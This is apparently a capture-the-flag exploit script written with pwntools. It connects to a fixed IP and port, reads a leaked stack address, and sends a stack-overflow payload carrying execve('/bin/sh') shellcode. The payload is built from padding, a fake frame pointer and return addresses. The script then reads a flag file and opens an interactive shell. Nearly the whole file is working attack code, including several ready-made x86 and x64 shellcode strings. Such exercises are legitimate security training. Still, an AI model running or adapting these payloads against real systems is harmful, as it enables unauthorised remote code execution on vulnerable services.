#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Author : yuan
# https://30cm.ml

host = "140.115.59.7"
port = 11002

yuan = remote(host,port)

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
s2 = '\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'
s3 = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
s4 = '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80'
x32_64 = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b' + '\x0f\x05'
x64_32 = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b' + '\xcd\x80'
s5 = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' #x86
s6 = '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'
s7 = '\xeb\x16\x5e\x31\xd2\x52\x56\x89\xe1\x89\xf3\x31\xc0\xb0\x0b\xcd\x80\x31\xdb\x31\xc0\x40\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'

s8 = '\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b'+ 'H1\xc0'+'H\xc7\xc0\x08\x02\x00\x00'  +'\x0f\x05'#520
# 246 kexec_load
s9 = '\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b'+ 'H1\xc0'+'H\xc7\xc0\xf6\x00\x00\x00'  +'\x0f\x05'


yuan.recvuntil('x')
ad = yuan.recvuntil('\n')
buf_addr = int(ad , 16)
main = 0x4007b0

#flag = '/home/bofscrev/flag.exe'
flag = '/bin/sh'
pop_rdi = 0x4008a3


shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b'
#shellcode += 'H1\xc0'   #xor rax,rax
#shellcode += 'H\xc7\xc0\xe8\x03\x00\x00'
#shellcode += 'H\xc7\xc0\x15\x00\x00\x00' # 15 access
#shellcode += 'H\xc7\xc0U\x00\x00\x00' # 55 create
shellcode += 'H\xc7\xc0;\x00\x00\x00' # 59 exec
#shellcode += 'H\xc7\xc08\x00\x00\x00' #56 clone
#shellcode += 'H\xc7\xc0\x08\x02\x00\x00' # 520 32bit execve
#shellcode += 'H\xc7\xc0\xf6\x00\x00\x00' # 246 kexec_load
#shellcode += 'H\xc7\xc0\x08\x02\x00\x00' # mov rax , 0x208  520 execve
shellcode += '\x0f\x05' # syscall

rdi = buf_addr + len(shellcode)

print "@@@" , hex(buf_addr)


p = shellcode
p += flag
p += '\x00' * (112 - (len(shellcode) + len(flag)))
p += "RBBBBBBP"
p += p64(buf_addr)
p += p64(rdi)
p += p64(buf_addr)

#payload = shellcode + "a" * 93 +chr(int(ad[10:-1],16))+chr(int(ad[8:-3],16))+chr(int(ad[6:-5],16))+chr(int(ad[4:-7],16))+chr(int(ad[2:-9],16))+ad[:-11].decode("hex")#+chr(int(ad[:-11],16))
"""
print hex(int(ad,16))
p = s9
p += 'a'*(120 - len(s9))
p += p64(int(ad,16))
"""
yuan.sendline(p)

yuan.sendline("cat /home/bof_shellcode/flag")

yuan.interactive()
